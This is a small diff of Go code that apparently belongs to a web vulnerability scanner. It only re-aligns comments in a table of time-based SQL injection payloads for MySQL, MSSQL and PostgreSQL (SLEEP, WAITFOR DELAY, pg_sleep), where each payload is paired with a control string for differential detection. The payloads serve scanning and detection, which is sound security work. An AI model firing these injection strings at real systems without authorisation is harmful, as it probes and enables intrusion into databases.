@@ -347,10 +347,10 @@ func xmlStripDoctype(body string) string {
 // contexts. A hit requires the slow payload to delay AND the matching control to
 // return fast — the same differential guard the timing cmd-injection check uses.
 var sqliTimePayloads = []struct{ slow, ctrl string }{
-	{"' AND SLEEP(6)-- -", "' AND SLEEP(0)-- -"},                            // MySQL, string context
-	{" AND SLEEP(6)", " AND SLEEP(0)"},                                      // MySQL, numeric context
-	{"'; WAITFOR DELAY '0:0:6'-- ", "'; WAITFOR DELAY '0:0:0'-- "},          // MSSQL
-	{"' || pg_sleep(6)-- ", "' || pg_sleep(0)-- "},                          // PostgreSQL, string context
+	{"' AND SLEEP(6)-- -", "' AND SLEEP(0)-- -"},                               // MySQL, string context
+	{" AND SLEEP(6)", " AND SLEEP(0)"},                                         // MySQL, numeric context
+	{"'; WAITFOR DELAY '0:0:6'-- ", "'; WAITFOR DELAY '0:0:0'-- "},             // MSSQL
+	{"' || pg_sleep(6)-- ", "' || pg_sleep(0)-- "},                             // PostgreSQL, string context
 	{"'||(SELECT 1 FROM PG_SLEEP(6))||'", "'||(SELECT 1 FROM PG_SLEEP(0))||'"}, // PostgreSQL, subselect
 }
 
